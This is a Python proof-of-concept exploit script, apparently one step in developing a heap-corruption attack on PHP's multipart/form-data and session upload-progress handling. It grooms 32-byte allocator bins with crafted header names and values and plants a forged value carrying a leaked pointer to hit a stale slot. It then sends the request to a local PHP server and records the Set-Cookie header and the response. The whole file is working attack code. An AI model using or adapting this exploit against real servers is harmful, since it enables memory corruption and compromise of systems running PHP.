#!/usr/bin/env python3
"""B: forge part FIRST with K headers: 31-char name (32B key) + 7-byte value
(32B smart_string). Then Content-Disposition and a 31-byte forge value (32B
raw). The 32B bin claims page 0x6e; when the page is claimed, the forge raw is
placed relative to the claim to hit slot4 = stale id 0x...6e080.
usage: b_forge32_hdrK.py K LEAK [MARK]
"""
import socket,sys,struct
K=int(sys.argv[1]); LEAK=int(sys.argv[2],0); MARK=sys.argv[3] if len(sys.argv)>3 else 'M'
BND=b'B'*10
o=bytearray()
def part(headers,data):
    global o
    o+=b'--'+BND+b'\r\n'+headers+b'\r\n\r\n'+data+b'\r\n'
v=bytearray(b'A'*31); struct.pack_into('<Q',v,0x10,LEAK); v[0x18:0x18+len(MARK)]=MARK.encode()
h=b''
for i in range(K):
    name=('X%029d'%i).encode()[:31]
    h += name+b': '+b'q'*7+b'\r\n'
h += b'Content-Disposition: form-data; name="forge"'
part(h, bytes(v))
part(b'Content-Disposition: form-data; name="PHPSESSID"', b'attacksessionid0001')
part(b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b'pwn')
o+=b'--'+BND+b'--\r\n'
req=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<200000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:140].decode('latin1','replace'))
print('BODY',rest[:90].decode('latin1','replace'))
open('/tmp/b_forge32_hdrK.resp','wb').write(data)
